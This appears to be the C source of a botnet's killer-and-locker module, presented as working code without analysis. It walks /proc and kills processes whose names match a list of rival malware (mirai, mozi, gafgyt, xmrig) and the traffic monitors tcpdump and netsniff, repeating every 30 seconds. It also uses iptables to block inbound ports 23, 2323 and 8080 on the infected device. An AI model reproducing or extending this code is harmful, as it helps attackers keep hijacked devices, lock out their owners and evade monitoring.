#include "common.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>

static const char *BOT_BLACKLIST[] = {
    "mirai", "mozi", "gafgyt", "tcpsh", "bot", "miner", "xmrig", 
    "kset", "kinjar", "tbot", "bash_bot", "tcpdump", "netsniff", NULL
};

static volatile bool locker_running = false;
static pthread_t locker_tid;

static void kill_competing_bots(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_name[0] < '0' || ent->d_name[0] > '9') continue;

        char path[256], comm[256];
        snprintf(path, sizeof(path), "/proc/%s/comm", ent->d_name);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        if (fgets(comm, sizeof(comm), f)) {
            comm[strcspn(comm, "\n")] = 0;
            for (int i = 0; BOT_BLACKLIST[i]; i++) {
                if (strstr(comm, BOT_BLACKLIST[i])) {
                    int pid = atoi(ent->d_name);
                    kill(pid, SIGKILL);
                }
            }
        }
        fclose(f);
    }
    closedir(dir);
}

void p2p_system_lock(void) {
#ifdef __linux__
    system("iptables -A INPUT -p tcp --dport 23 -j DROP");
    system("iptables -A INPUT -p tcp --dport 2323 -j DROP");
    system("iptables -A INPUT -p tcp --dport 8080 -j DROP");
#endif
}

static void *locker_worker(void *arg) {
    (void)arg;
    p2p_system_lock();
    while (locker_running) {
        kill_competing_bots();
        sleep(30);
    }
    return NULL;
}

void p2p_killer_start(void) {
    printf("Executing competing bot removal...\n");
    kill_competing_bots();
    printf("Removal complete.\n");
}

void p2p_locker_start(int mode) {
    if (locker_running) return;
    locker_running = true;
    if (pthread_create(&locker_tid, NULL, locker_worker, NULL) == 0) {
        pthread_detach(locker_tid);
        printf("System locker activated (Mode: %d).\n", mode);
    } else {
        locker_running = false;
        printf("Failed to activate locker.\n");
    }
}

void p2p_locker_stop(void) {
    locker_running = false;
    printf("System locker deactivated.\n");
}
